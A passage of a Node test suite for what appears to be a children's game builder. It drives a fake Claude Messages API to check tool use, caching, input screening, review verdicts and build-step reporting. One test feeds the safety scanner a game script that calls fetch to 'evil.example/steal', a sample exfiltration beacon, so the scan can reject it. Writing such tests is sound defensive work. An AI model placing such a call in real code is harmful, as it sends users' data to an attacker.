// The Claude provider against a local fake Messages API (ANTHROPIC_BASE_URL), so the real agent loop, streaming,
// tool execution, prompt caching blocks, the input classifier and model review run without a real key.
process.env.BRB_DB = ':memory:';
process.env.BRB_SILENT = '1';
process.env.LOG_REQUESTS = '0';
process.env.BRB_DATA_DIR = (await import('node:os')).tmpdir() + '/brb-claude-test-' + process.pid;
import test from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';

const requests = []; const script = [];
const fake = http.createServer((req, res) => {
  let body = ''; req.on('data', c => (body += c)); req.on('end', () => {
    const b = JSON.parse(body || '{}'); requests.push({ url: req.url, headers: req.headers, body: b });
    const sys = JSON.stringify(b.system || '');
    if (!b.stream) {
      const text = sys.includes('You review games') ? '{"verdict":"needs_changes","reasons":["Please change the hero, it looks like a famous character."]}'
        : sys.includes('You check pictures') ? '{"verdict":"allow","reason":"a drawing"}'
        : JSON.stringify(/castle/.test(JSON.stringify(b.messages)) ? { verdict: 'refuse', category: 'copyright' } : { verdict: 'allow', category: 'none' });
      res.setHeader('content-type', 'application/json');
      return res.end(JSON.stringify({ id: 'msg_x', type: 'message', role: 'assistant', model: b.model, content: [{ type: 'text', text }], stop_reason: 'end_turn', stop_sequence: null, usage: { input_tokens: 10, output_tokens: 5 } }));
    }
    // A script entry is a list of blocks, { blocks, stop } (to force a stop_reason such as 'max_tokens'),
    // { blocks, hold: ms } (the stream pauses after the first block's first piece, e.g. so a test can abort), or 'error400'.
    const entry = script.shift() || [{ type: 'text', text: 'Done.' }];
    if (entry === 'error400') { res.writeHead(400, { 'content-type': 'application/json' }); return res.end(JSON.stringify({ type: 'error', error: { type: 'invalid_request_error', message: 'x' } })); }
    const blocks = Array.isArray(entry) ? entry : entry.blocks;
    res.writeHead(200, { 'content-type': 'text/event-stream' });
    const out = []; let closed = false; res.on('close', () => { closed = true; });
    const ev = (name, data) => out.push(`event: ${name}\ndata: ${JSON.stringify({ type: name, ...data })}\n\n`);
    ev('message_start', { message: { id: 'msg_s', type: 'message', role: 'assistant', model: b.model, content: [], stop_reason: null, stop_sequence: null, usage: { input_tokens: 100, output_tokens: 0, cache_read_input_tokens: 50 } } });
    blocks.forEach((blk, i) => {
      if (blk.type === 'text') { ev('content_block_start', { index: i, content_block: { type: 'text', text: '' } }); for (const part of blk.text.match(/.{1,8}/gs)) ev('content_block_delta', { index: i, delta: { type: 'text_delta', text: part } }); }
      // Thinking as current models stream it by default: an empty thinking text, then only a signature.
      else if (blk.type === 'thinking') { ev('content_block_start', { index: i, content_block: { type: 'thinking', thinking: '', signature: '' } }); ev('content_block_delta', { index: i, delta: { type: 'signature_delta', signature: 'sig-fake' } }); }
      else if (blk.type === 'redacted_thinking') ev('content_block_start', { index: i, content_block: { type: 'redacted_thinking', data: 'opaque' } });
      else { ev('content_block_start', { index: i, content_block: { type: 'tool_use', id: `tu_${i}_${requests.length}`, name: blk.name, input: {} } }); const j = JSON.stringify(blk.input); for (let k = 0; k < j.length; k += 500) ev('content_block_delta', { index: i, delta: { type: 'input_json_delta', partial_json: j.slice(k, k + 500) } }); }
      ev('content_block_stop', { index: i });
    });
    ev('message_delta', { delta: { stop_reason: entry.stop || (blocks.some(x => x.type === 'tool_use') ? 'tool_use' : 'end_turn'), stop_sequence: null }, usage: { output_tokens: 42 } });
    ev('message_stop', {});
    if (!entry.hold) { res.end(out.join('')); return; }
    res.write(out.slice(0, 3).join(''));   // message_start, the first block's start and first piece
    setTimeout(() => { if (!closed) res.end(out.slice(3).join('')); }, entry.hold);
  });
});
await new Promise(r => fake.listen(0, r));
process.env.ANTHROPIC_BASE_URL = `http://127.0.0.1:${fake.address().port}`;
test.after(() => fake.close());

const { config } = await import('../../server/config.js');
config.anthropicKey = 'sk-ant-test-fake';
const fsmod = await import('node:fs');
const exe = process.env.BRB_CHROMIUM || ['/opt/pw-browsers/chromium-1194/chrome-linux/chrome', '/opt/pw-browsers/chromium_headless_shell-1194/chrome-linux/headless_shell'].find(f => fsmod.existsSync(f));
const auth = await import('../../server/auth.js');
const games = await import('../../server/services/games.js');
const { runTurn, providerName } = await import('../../server/builder/agent.js');
const { loadChat } = await import('../../server/builder/chat.js');
const { reviewVersion } = await import('../../server/services/review.js');
const { SYSTEM_PROMPT, THREE_D_RULES } = await import('../../server/builder/prompt.js');
const { threeImportMap } = await import('../../server/services/vendor.js');
// Every import before the first test: test.after (which closes the fake API) runs once the tests registered so far
// are done, so a top-level await between tests would close it early when only some tests are picked.
const { TOOLS } = await import('../../server/builder/prompt.js');
const { tEn } = await import('../../server/i18n/index.js');
const runner = await import('../../server/builder/runner.js');
const turns = await import('../../server/builder/turns.js');
const { appendChat } = await import('../../server/builder/chat.js');
const { q, today } = await import('../../server/db.js');

const GAME = '<title>Fox Hop</title><style>body{margin:0}</style><canvas id="c"></canvas><script>const CONFIG = { speed: 1 }; BRB.sfx.play("jump");</script>';

test('Claude provider: streams text, runs tools, makes versions, caches the system prompt and source', async () => {
  assert.equal(providerName(), 'claude');
  const u = auth.createUser({ username: 'ClaudeKid', password: 'secret1' }); const g = games.createGame(u.id, {});
  script.push(
    [{ type: 'text', text: "Here's my plan: a fox that hops over logs. " }, { type: 'tool_use', name: 'set_game', input: { title: 'Fox Hop', icon: '🦊', category: 'arcade', tags: ['fox'] } }, { type: 'tool_use', name: 'write_game', input: { html: GAME, notes: 'First version' } }],
    [{ type: 'tool_use', name: 'edit_game', input: { edits: [{ find: 'speed: 2', replace: 'speed: 3' }], notes: 'oops' } }],
    [{ type: 'tool_use', name: 'edit_game', input: { edits: [{ find: 'speed: 1', replace: 'speed: 2' }], notes: 'Faster fox' } }],
    [{ type: 'tool_use', name: 'test_notes', input: { checklist: ['Hop over a log'] } }, { type: 'tool_use', name: 'ask_user', input: { question: 'What next?', options: ['Make it harder', 'Add a second level', 'Change the hero to a dragon'] } }],
  );
  const events = [];
  const r = await runTurn({ user: u, gameId: g.id, text: 'a fox jumping game', pro: true, emit: (n, d) => events.push([n, d]) });
  assert.equal(r.ok, true, JSON.stringify(events.filter(e => e[0] === 'error')));
  const names = events.map(e => e[0]);
  assert.ok(names.filter(n => n === 'text').length > 3, 'text streamed in pieces');
  assert.deepEqual(events.filter(e => e[0] === 'version').map(e => e[1].number), [1, 2]);
  assert.ok(names.includes('meta') && names.includes('notes') && names.includes('ask'));
  assert.match(games.getVersion(games.getGame(g.id).current_version_id).html, /speed: 2/);

  const calls = requests.filter(x => x.body.stream);
  assert.equal(calls.length, 4);
  const first = calls[0].body;
  assert.equal(first.model, config.builderProModel, 'Pro quality uses the pro model');
  assert.equal(first.system[0].text, SYSTEM_PROMPT); assert.deepEqual(first.system[0].cache_control, { type: 'ephemeral' });
  assert.match(first.system[1].text, /CURRENT GAME: none yet/); assert.deepEqual(first.system[1].cache_control, { type: 'ephemeral' });
  assert.match(calls[1].body.system[1].text, /<current_game>[\s\S]*speed: 1/, 'the new source is passed as its own block');
  assert.ok(first.tools.find(t => t.name === 'write_game').eager_input_streaming);
  assert.equal(first.max_tokens, config.builderMaxTokens);
  assert.match(calls[0].headers['anthropic-beta'] || '', /server-side-fallback-2026-07-01/); assert.equal(first.fallbacks, 'default');
  assert.equal(first.temperature, undefined); assert.equal(first.tool_choice, undefined, 'no forced tool use');
  const failed = calls[2].body.messages.at(-1).content[0];
  assert.equal(failed.type, 'tool_result'); assert.equal(failed.is_error, true); assert.match(failed.content, /not found/, 'edit failures go back to the model');
  assert.ok(requests.some(x => !x.body.stream && /screen messages that children send/.test(JSON.stringify(x.body.system))), 'input classifier ran first');

  const chat = loadChat(g.id);
  assert.doesNotMatch(JSON.stringify(chat.messages), /<script|<canvas/, 'no game source in the transcript');
  const row = (await import('../../server/db.js')).q.get('SELECT tokens_in, tokens_out FROM builder_chats WHERE game_id=?', g.id);
  assert.ok(row.tokens_in >= 600 && row.tokens_out >= 168, 'usage recorded');

  // next turn: history is rebuilt from the transcript as text only
  script.push([{ type: 'text', text: 'Sure!' }]);
  await runTurn({ user: u, gameId: g.id, text: 'thanks', emit: () => {} });
  const last = requests.filter(x => x.body.stream).at(-1).body;
  assert.equal(last.model, config.builderModel);
  assert.equal(last.messages[0].content, 'a fox jumping game');
  assert.match(last.messages[1].content, /Built version 2: Faster fox/);
  assert.doesNotMatch(JSON.stringify(last.messages), /<canvas/);
});

test('3D: the fixed 3D rules block is sent only for 3D, and start_from_template copies Star Island in', async () => {
  const u = auth.createUser({ username: 'ClaudeThreeD', password: 'secret1' }); const g = games.createGame(u.id, {});
  script.push(
    [{ type: 'tool_use', name: 'start_from_template', input: { template: 'island', notes: 'Started a 3D island' } }],
    [{ type: 'tool_use', name: 'edit_game', input: { edits: [{ find: "  sky: 'day',", replace: "  sky: 'night'," }, { find: "  hero: '🐣',", replace: "  hero: '🦊'," }], notes: 'A fox at night' } }],
    [{ type: 'text', text: 'Your 3D island is ready!' }],
  );
  const before = requests.length; const events = [];
  const r = await runTurn({ user: u, gameId: g.id, text: 'make a 3D game with a fox', emit: (n, d) => events.push([n, d]) });
  assert.equal(r.ok, true, JSON.stringify(events.filter(e => e[0] === 'error')));
  const calls = requests.slice(before).filter(x => x.body.stream);
  assert.equal(calls.length, 3);
  const sys = calls[0].body.system;
  assert.equal(sys[0].text, SYSTEM_PROMPT, 'the main prompt is unchanged (cache-friendly)');
  assert.equal(sys[1].text, THREE_D_RULES); assert.deepEqual(sys[1].cache_control, { type: 'ephemeral' });
  assert.match(sys[2].text, /CURRENT GAME: none yet/); assert.match(sys[3].text, /^LANGUAGE:/);
  assert.ok(THREE_D_RULES.includes(threeImportMap()), 'the rules carry the exact pinned import map');
  for (const s of ['start_from_template', 'fit3d', '60 to 75', 'reduced-motion', 'Chromebooks', 'GLTFLoader.parse', 'InstancedMesh', 'webglcontextlost']) assert.ok(THREE_D_RULES.includes(s), s);
  assert.ok(calls[0].body.tools.some(t => t.name === 'start_from_template'));
  assert.match(calls[1].body.system[2].text, /<current_game>[\s\S]*type="importmap"/, 'the template is the current game for the next step');
  const v = games.getVersion(games.getGame(g.id).current_version_id);
  assert.equal(v.number, 2); assert.equal(v.safety_status, 'pass', v.safety_report);
  assert.match(v.html, /sky: 'night'/); assert.match(v.html, /hero: '🦊'/); assert.ok(v.html.includes(threeImportMap()));
  // Later turns on a 3D game keep the block; a 2D game never gets it.
  script.push([{ type: 'text', text: 'Sure!' }]);
  await runTurn({ user: u, gameId: g.id, text: 'thanks', emit: () => {} });
  assert.equal(requests.filter(x => x.body.stream).at(-1).body.system[1].text, THREE_D_RULES);
  const g2 = games.createGame(u.id, {});
  script.push([{ type: 'text', text: 'What kind of game?' }]);
  await runTurn({ user: u, gameId: g2.id, text: 'a catching game with apples', emit: () => {} });
  const sys2 = requests.filter(x => x.body.stream).at(-1).body.system;
  assert.equal(sys2.length, 3); assert.ok(!sys2.some(b => b.text === THREE_D_RULES));
});

test('the model classifier can refuse what the word rules miss', async () => {
  const u = auth.createUser({ username: 'ClaudeKid2', password: 'secret1' }); const g = games.createGame(u.id, {});
  const before = requests.filter(x => x.body.stream).length;
  const events = []; const r = await runTurn({ user: u, gameId: g.id, text: 'the castle from that famous princess movie', emit: (n, d) => events.push([n, d]) });
  assert.equal(r.refused, 'copyright'); assert.equal(requests.filter(x => x.body.stream).length, before, 'the Builder model never saw it');
});

test('model review returns a structured verdict; flagged versions still go to a human', async () => {
  const r = await reviewVersion({ title: 'Fox', description: '', tags: '', category: 'arcade' }, { html: GAME, safety_status: 'pass', safety_report: '{}' });
  assert.equal(r.verdict, 'needs_changes'); assert.match(r.reasons[0], /hero/); assert.equal(r.by, config.builderModel);
  const call = requests.at(-1).body; assert.equal(call.output_config.format.type, 'json_schema');
  const blocks = call.messages[0].content; // now a content array (text + any pictures)
  assert.equal(blocks[0].type, 'text'); assert.match(blocks[0].text, /<game>[\s\S]*Fox Hop/);
  assert.match(blocks[0].text, /Code:/, 'a small game is sent in full, not trimmed');
  const f = await reviewVersion({ title: 'Fox' }, { html: GAME, safety_status: 'flag', safety_report: '{}' });
  assert.equal(f.verdict, 'unavailable');
});

test('review attaches game pictures when screenshots are available', { skip: !exe ? 'no Chromium' : false, timeout: 60_000 }, async () => {
  const snapshot = await import('../../server/services/snapshot.js');
  config.snapshots = true; config.chromiumPath = exe;
  try {
    const r = await reviewVersion({ title: 'Fox', description: '', tags: '', category: 'arcade' }, { html: GAME, safety_status: 'pass', safety_report: '{}' });
    assert.equal(r.verdict, 'needs_changes');
    const blocks = requests.at(-1).body.messages[0].content;
    const imgs = blocks.filter(b => b.type === 'image');
    assert.ok(imgs.length >= 1, 'at least the title screen was attached');
    assert.equal(imgs[0].source.type, 'base64'); assert.equal(imgs[0].source.media_type, 'image/jpeg');
    assert.match(blocks[0].text, /Pictures: \d+ attached/);
  } finally { config.snapshots = false; config.chromiumPath = ''; await snapshot.closeBrowser(); }
});

// ---- Live build steps (steps.js) with the Claude provider ----------------------------------------------------
/** step + stepinfo events -> one object per row (without i), in row order. */
const rowsOf = events => { const rows = []; for (const [n, d] of events) { if (n === 'step') rows[d.i - 1] = { ...d }; else if (n === 'stepinfo') Object.assign(rows[d.i - 1], d); } return rows.map(({ i, ...r }) => r); };
const recRows = rec => rec.s.map(([key, , f]) => ({ key, ...(f || {}) }));
const idx = (events, name, pred = () => true) => events.findIndex(([n, d]) => n === name && pred(d));
// 100 lines, about 3 KB, so the input streams in several 500-byte pieces.
const BIG = ['<title>Fox Hop</title><style>body{margin:0}</style><canvas id="c"></canvas><script>', 'const CONFIG = { speed: 1, size: 2 };',
  ...Array.from({ length: 97 }, (_, k) => `// ${k + 1}: the fox hops over logs`), 'BRB.sfx.play("jump");</script>'].join('\n');
async function stepTurn(u, g, text, rounds) {
  script.push(...rounds);
  const events = []; const r = await runTurn({ user: u, gameId: g.id, text, emit: (n, d) => events.push([n, d]) });
  assert.equal(script.length, 0, 'every scripted round was used');
  return { r, events, rows: rowsOf(events), done: events.find(e => e[0] === 'done')[1] };
}

test('tool schema: notes comes first in write_game and edit_game, and both fields are required', () => {
  for (const [name, other] of [['write_game', 'html'], ['edit_game', 'edits']]) {
    const tool = TOOLS.find(t => t.name === name);
    assert.deepEqual(Object.keys(tool.input_schema.properties), ['notes', other], name);
    assert.deepEqual(tool.input_schema.required, ['notes', other]);
    assert.match(tool.description, new RegExp(`Write notes first, then ${other}\\.`));
    assert.match(tool.input_schema.properties.notes.description, new RegExp(`^Write this FIRST, before ${other}:`));
  }
  assert.match(SYSTEM_PROMPT, /write_game\(notes, html\)/); assert.match(SYSTEM_PROMPT, /edit_game\(notes, edits\)/);
  assert.match(SYSTEM_PROMPT, /notes comes first/);
});

test('build steps: rounds, a real thinking block, the AI\'s plan streamed first, live counters, failures on their own row', async () => {
  assert.equal(BIG.split('\n').length, 100); assert.ok(BIG.length > 2500);
  const u = auth.createUser({ username: 'StepsKid', password: 'secret1' }); const g = games.createGame(u.id, {});
  const before = requests.filter(x => x.body.stream).length;
  const { r, events, rows, done } = await stepTurn(u, g, 'a fox jumping game', [
    [{ type: 'thinking' }, { type: 'text', text: "Here's my plan: a fox that hops over logs. " }, { type: 'tool_use', name: 'set_game', input: { title: 'Fox Hop', icon: '🦊', category: 'arcade' } }, { type: 'tool_use', name: 'write_game', input: { notes: 'First version', html: BIG } }],
    [{ type: 'tool_use', name: 'edit_game', input: { notes: 'Oops', edits: [{ find: 'speed: 9', replace: 'speed: 3' }] } }],
    [{ type: 'tool_use', name: 'edit_game', input: { notes: 'Faster and bigger fox', edits: [{ find: 'speed: 1', replace: 'speed: 2' }, { find: 'size: 2', replace: 'size: 3' }] } }],
    [{ type: 'tool_use', name: 'test_notes', input: { checklist: ['Hop over a log'] } }, { type: 'tool_use', name: 'ask_user', input: { question: 'What next?', options: ['Make it harder', 'Add a level'] } }],
  ]);
  assert.equal(r.ok, true, JSON.stringify(events.filter(e => e[0] === 'error')));
  assert.deepEqual(rows.map(x => x.key), ['screen', 'think', 'write', 'name', 'check', 'think', 'edit', 'think', 'edit', 'check', 'think', 'notes', 'ask']);
  assert.deepEqual(rows[0], { key: 'screen' });
  assert.deepEqual(rows[1], { key: 'think', n: 1, c: 'start', a: 1, th: 1 }, 'round 1: first message, a thinking block really streamed, no game yet');
  assert.deepEqual(rows[2], { key: 'write', plan: 'First version', l: 100 });
  assert.deepEqual(rows[3], { key: 'name', title: 'Fox Hop', icon: '🦊' }, 'set_game runs first (block order), after the write row started');
  assert.equal(rows[4].key, 'check'); assert.equal(rows[4].v, 1); assert.ok(['pass', 'flag'].includes(rows[4].st), rows[4].st);
  assert.deepEqual(rows[5], { key: 'think', n: 2, c: 'next', a: 1 }, 'no thinking block: no th');
  assert.deepEqual(rows[6], { key: 'edit', plan: 'Oops', e: 1, ok: false }, 'the failed edit is marked');
  assert.deepEqual(rows[7], { key: 'think', n: 3, c: 'retry', a: 1 });
  assert.deepEqual(rows[8], { key: 'edit', plan: 'Faster and bigger fox', e: 2 });
  assert.equal(rows[9].key, 'check'); assert.equal(rows[9].v, 2);
  assert.deepEqual(rows[10], { key: 'think', n: 4, c: 'next', a: 1 });
  // The plan streamed before the code finished (notes first), and the lines counter ended exact.
  const infos = events.map((e, k) => [k, e[0], e[1]]).filter(([, n, d]) => n === 'stepinfo' && d.i === 3);
  const plan = infos.find(([, , d]) => d.plan); const lastL = infos.filter(([, , d]) => 'l' in d).at(-1);
  assert.ok(plan[0] < lastL[0], 'the plan stepinfo came before the last lines stepinfo');
  assert.ok(!('l' in plan[2]) || plan[2].l < 100, 'the code was still streaming when the plan arrived');
  assert.equal(lastL[2].l, 100);
  // Each row comes before its card; a failure marks its own row (i = 7), not the newest.
  assert.ok(idx(events, 'step', s => s.key === 'write') < idx(events, 'step', s => s.key === 'name'));
  assert.ok(idx(events, 'step', s => s.key === 'name') < idx(events, 'meta') && idx(events, 'meta') < idx(events, 'step', s => s.key === 'check'));
  assert.ok(idx(events, 'step', s => s.key === 'check') < idx(events, 'version'));
  assert.deepEqual(events.filter(e => e[0] === 'stepinfo' && e[1].ok === false).map(e => e[1].i), [7]);
  assert.equal(idx(events, 'progress'), -1, 'the old progress event is gone');
  // The record: same rows, AI mode, rounds and tokens; stored last in the transcript.
  assert.equal(done.steps.p, 'ai'); assert.equal(done.steps.r, 4); assert.equal(done.steps.end, 'ok');
  assert.ok(done.steps.ti >= 600 && done.steps.to >= 168, 'tokens read and written');
  assert.deepEqual(recRows(done.steps), rows);
  assert.deepEqual(loadChat(g.id).messages.at(-1).events.at(-1), ['steps', done.steps]);
  // The request itself was not changed to get thinking.
  for (const c of requests.filter(x => x.body.stream).slice(before)) { assert.equal(c.body.thinking, undefined); assert.equal(c.body.temperature, undefined); }
  // Next turn: round 1 also reads the game (g), and the model never sees the steps record.
  const next = await stepTurn(u, g, 'thanks', [[{ type: 'text', text: 'Sure!' }]]);
  assert.deepEqual(next.rows, [{ key: 'screen' }, { key: 'think', n: 1, c: 'start', a: 1, g: 1 }]);
  const sent = JSON.stringify(requests.filter(x => x.body.stream).at(-1).body.messages);
  assert.match(sent, /Built version 2: Faster and bigger fox/);
  assert.doesNotMatch(sent, /"steps"|"th":|\["screen"|"plan"/);
});

test('build steps: notes after html still give the plan; long notes come from the real input; a playtest without screenshots says it could not run; a cut-off call is marked', async () => {
  const u = auth.createUser({ username: 'StepsKid2', password: 'secret1' }); const g = games.createGame(u.id, {});
  const { events, rows, done } = await stepTurn(u, g, 'a fox game', [
    [{ type: 'tool_use', name: 'write_game', input: { html: BIG, notes: 'Old order notes' } }],
    [{ type: 'tool_use', name: 'edit_game', input: { notes: '  Z' + 'z'.repeat(4999), edits: [{ find: 'speed: 1', replace: 'speed: 2' }] } }],
    [{ type: 'tool_use', name: 'playtest_game', input: {} }],
    { blocks: [{ type: 'tool_use', name: 'write_game', input: { notes: 'Too long', html: BIG } }], stop: 'max_tokens' },
    [{ type: 'redacted_thinking' }, { type: 'text', text: 'I will make it shorter.' }],
  ]);
  assert.deepEqual(rows.map(x => x.key), ['screen', 'think', 'write', 'check', 'think', 'edit', 'check', 'think', 'playtest', 'think', 'write', 'think']);
  assert.deepEqual(rows[2], { key: 'write', l: 100, plan: 'Old order notes' }, 'old key order: the plan arrives at the end');
  assert.deepEqual(rows[5], { key: 'edit', e: 1, plan: 'Z' + 'z'.repeat(119) }, 'notes too long to stream: the plan is the real notes, cleaned and capped');
  assert.ok(idx(events, 'stepinfo', d => d.i === 6 && d.plan) > idx(events, 'step', s => s.key === 'check' && s.v === 2), 'set after the tool ran');
  assert.deepEqual(rows[7], { key: 'think', n: 3, c: 'next', a: 1 });
  // Playtesting is off in unit tests: the AI asked for one, so the row is there, marked as not run (never as a test).
  assert.deepEqual(rows[8], { key: 'playtest', v: 2, ok: false }, 'an attempted playtest says it could not run');
  assert.equal(idx(events, 'playtest'), -1, 'no playtest card: nothing was tested');
  assert.deepEqual(rows[9], { key: 'think', n: 4, c: 'retry', a: 1 }, 'the next round reads that error, and the card shows it');
  assert.deepEqual(rows[10], { key: 'write', plan: 'Too long', l: 100, ok: false, why: 'cut' });
  assert.deepEqual(rows[11], { key: 'think', n: 5, c: 'retry', a: 1, th: 1 }, 'redacted thinking counts as thinking too');
  assert.equal(done.steps.end, 'ok'); assert.equal(done.steps.r, 5);
});

test('build steps: a failed safety scan gives "reading the safety report" rounds and exactly two fix rows', async () => {
  const u = auth.createUser({ username: 'StepsKid3', password: 'secret1' }); const g = games.createGame(u.id, {});
  const BAD = '<title>x</title><style>b{}</style><canvas></canvas><script>fetch("https://evil.example/steal")</script>';
  const { events, rows } = await stepTurn(u, g, 'a fox game', [1, 2, 3].map(k => [{ type: 'tool_use', name: 'write_game', input: { notes: `Try ${k}`, html: BAD } }]));
  // k = the must-fix problems the version card lists, so the row and the card never disagree.
  const k = events.find(e => e[0] === 'version')[1].issues.filter(x => x.startsWith('Must fix')).length;
  assert.ok(k >= 1);
  assert.deepEqual(rows, [
    { key: 'screen' }, { key: 'think', n: 1, c: 'start', a: 1 }, { key: 'write', plan: 'Try 1', l: 1 }, { key: 'check', st: 'fail', v: 1, k },
    { key: 'think', n: 2, c: 'scan', a: 1 }, { key: 'fix', via: 'write', plan: 'Try 2', l: 1 }, { key: 'check', st: 'fail', v: 2, k },
    { key: 'think', n: 3, c: 'scan', a: 1 }, { key: 'fix', via: 'write', plan: 'Try 3', l: 1 }, { key: 'check', st: 'fail', v: 3, k },
  ]);
  assert.ok(events.filter(e => e[0] === 'text').map(e => e[1].text).join('').includes(tEn('builder.scanStillFailing')));
});

test('build steps: a tool that failed without a row of its own leads to "what\'s next"; a flagged scan counts what it listed', async () => {
  const u = auth.createUser({ username: 'StepsKid7', password: 'secret1' }); const g = games.createGame(u.id, {});
  // Two scripts from libraries nobody reviewed: two flag issues on one version.
  const FLAGGED = BIG.replace('<script>', '<script src="https://cdnjs.cloudflare.com/ajax/libs/nope/1.0/a.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/nope/1.0/b.js"></script><script>');
  const { rows, events } = await stepTurn(u, g, 'a fox game', [
    [{ type: 'tool_use', name: 'set_game', input: { category: 'not-a-category' } }],
    [{ type: 'tool_use', name: 'write_game', input: { notes: 'Fox with helpers', html: FLAGGED } }],
    [{ type: 'text', text: 'Done!' }],
  ]);
  assert.deepEqual(rows.map(x => x.key), ['screen', 'think', 'think', 'write', 'check', 'think']);
  assert.deepEqual(rows[2], { key: 'think', n: 2, c: 'next', a: 1 }, 'set_game changed nothing and has no row: no "went wrong" round');
  const v = events.find(e => e[0] === 'version')[1];
  assert.equal(v.status, 'flag'); assert.equal(rows[4].st, 'flag');
  assert.equal(rows[4].k, v.issues.length, 'the check row counts the same issues the version card lists');
  assert.ok(rows[4].k >= 2, `issues: ${rows[4].k}`);
});

test('build steps: a provider error stops the card with end "error"', async () => {
  const u = auth.createUser({ username: 'StepsKid4', password: 'secret1' }); const g = games.createGame(u.id, {});
  const { r, events, rows, done } = await stepTurn(u, g, 'a fox game', ['error400']);
  assert.equal(r.ok, false);
  assert.equal(events.find(e => e[0] === 'error')[1].message, tEn('builder.errors.muddled'));
  assert.deepEqual(rows, [{ key: 'screen' }, { key: 'think', n: 1, c: 'start' }]);
  assert.equal(done.steps.end, 'error'); assert.equal(done.steps.r, 1);
  assert.deepEqual(loadChat(g.id).messages.at(-1).events.at(-1), ['steps', done.steps]);
});

test('build steps: a real playtest with problems gives "looking at the pictures", then a fix row', { skip: !exe ? 'no Chromium' : false, timeout: 90_000 }, async () => {
  const snapshot = await import('../../server/services/snapshot.js');
  config.snapshots = true; config.chromiumPath = exe;
  try {
    const u = auth.createUser({ username: 'StepsKid5', password: 'secret1' }); const g = games.createGame(u.id, {});
    const { events, rows } = await stepTurn(u, g, 'a fox game', [
      [{ type: 'tool_use', name: 'write_game', input: { notes: 'First version', html: GAME } }],
      [{ type: 'tool_use', name: 'playtest_game', input: {} }],
      [{ type: 'tool_use', name: 'edit_game', input: { notes: 'Faster fox', edits: [{ find: 'speed: 1', replace: 'speed: 2' }] } }],
      [{ type: 'text', text: 'Looks good now!' }],
    ]);
    assert.deepEqual(rows.map(x => x.key), ['screen', 'think', 'write', 'check', 'think', 'playtest', 'think', 'fix', 'check', 'think']);
    const pt = rows[5];
    assert.equal(pt.v, 1); assert.ok(pt.pics >= 1 && pt.pics <= 2, `pictures: ${pt.pics}`); assert.ok(pt.probs >= 1, 'the missing __brbTest hook is a problem');
    assert.equal(pt.probs, events.find(e => e[0] === 'playtest')[1].problems, 'the same count as the playtest card');
    assert.ok(idx(events, 'step', s => s.key === 'playtest') < idx(events, 'playtest'));
    assert.deepEqual(rows[6], { key: 'think', n: 3, c: 'look', a: 1 });
    assert.deepEqual(rows[7], { key: 'fix', via: 'edit', plan: 'Faster fox', e: 1 });
    assert.deepEqual(rows[9], { key: 'think', n: 4, c: 'next', a: 1 });
  } finally { config.snapshots = false; config.chromiumPath = ''; await snapshot.closeBrowser(); }
});

test('build steps: starting from the ready-made 3D world gives a template row, then the safety check', async () => {
  const u = auth.createUser({ username: 'StepsKid6', password: 'secret1' }); const g = games.createGame(u.id, {});
  const { events, rows } = await stepTurn(u, g, 'make a 3D game with a fox', [
    [{ type: 'tool_use', name: 'start_from_template', input: { template: 'island', notes: 'Started a 3D island' } }],
    [{ type: 'text', text: 'Your 3D island is ready!' }],
  ]);
  assert.deepEqual(rows, [{ key: 'screen' }, { key: 'think', n: 1, c: 'start', a: 1 }, { key: 'template' }, { key: 'check', st: 'pass', v: 1 }, { key: 'think', n: 2, c: 'next', a: 1 }]);
  assert.ok(idx(events, 'step', s => s.key === 'check') < idx(events, 'version'));
});

// ---- Builds that carry on after a restart, a stop mid-stream, and no model ids in comments (runner.js) ------------
const streamed = () => requests.filter(x => x.body.stream);

test('CL-10 resume: the note says what was already done, the rounds left are honoured, and a Continue quotes the earlier message', async () => {
  const u = auth.createUser({ username: 'ResumeKid', password: 'secret1' }); const g = games.createGame(u.id, {});
  // Handed off after it saved version 1, with 12 of its 14 model calls used.
  const row = turns.create({ gameId: g.id, userId: u.id, status: 'interrupted', request: { text: 'a fox game' }, attempt: 1, chargedDay: today(), provider: 'ai' });
  q.run('UPDATE builder_turns SET model_calls=12 WHERE id=?', row.id);
  appendChat(g.id, u.id, [{ role: 'user', text: 'a fox game', at: Date.now(), turn: row.id }]);
  games.addVersion(g.id, GAME, { notes: 'First version', createdBy: u.id, safetyStatus: 'pass' });
  const before = streamed().length;
  script.push(...Array.from({ length: 6 }, () => [{ type: 'tool_use', name: 'test_notes', input: { checklist: ['Hop over a log'] } }]));
  assert.equal(runner.recover().resumed, 1);
  await runner.idle(runner.jobFor(g.id));
  const calls = streamed().slice(before);
  script.length = 0;
  assert.equal(calls.length, 4, 'max(4, 14 - 12) model calls');
  const msgs = calls[0].body.messages; const last = msgs.at(-1);
  assert.equal(last.role, 'user');
  assert.deepEqual(last.content.slice(0, -1), [{ type: 'text', text: 'a fox game' }], 'the message itself, then the note');
  const note = last.content.at(-1).text;
  assert.match(note, /^\[Note from the platform: the server restarted while you were working on this message, so your work was cut off\./);
  assert.match(note, /Already done in this turn: Built version 1: First version \(safety check: pass\)\./);
  assert.match(note, /Don't start over and don't redo finished work\./);
  assert.ok(!msgs.slice(0, -1).some(m => JSON.stringify(m).includes('a fox game')), 'the build\'s own message is not in the history too');
  assert.equal(turns.get(row.id).status, 'done'); assert.equal(turns.get(row.id).attempt, 2); assert.equal(turns.get(row.id).model_calls, 16);

  // Continue after a build that stopped with nothing saved.
  const g2 = games.createGame(u.id, {});
  const old = turns.create({ gameId: g2.id, userId: u.id, status: 'failed', request: { text: 'a dragon game' } });
  q.run("UPDATE builder_turns SET end_reason='restart', can_continue=1, ended_at=? WHERE id=?", Date.now(), old.id);
  script.push([{ type: 'text', text: 'Carrying on!' }]);
  const r = await runTurn({ user: u, gameId: g2.id, text: 'Please carry on with my last message.', continueOf: old.id, emit: () => {} });
  assert.equal(r.ok, true);
  const content = streamed().at(-1).body.messages.at(-1).content;
  assert.equal(content[0].text, 'Please carry on with my last message.');
  assert.match(content.at(-1).text, /The builder pressed Continue after the build stopped early, so carry on with their earlier message: «a dragon game»\./);
  assert.match(content.at(-1).text, /Already done in this turn: nothing saved yet\./);
});

test('CL-11 a stop in the middle of a stream ends the build at once: no more requests, no tools, no "muddled" error', async () => {
  const u = auth.createUser({ username: 'AbortKid', password: 'secret1' }); const g = games.createGame(u.id, {});
  script.push({ hold: 1500, blocks: [{ type: 'text', text: 'Let me build that for you right away.' }, { type: 'tool_use', name: 'write_game', input: { notes: 'First', html: GAME } }] });
  const ac = new AbortController(); const events = []; const before = streamed().length;
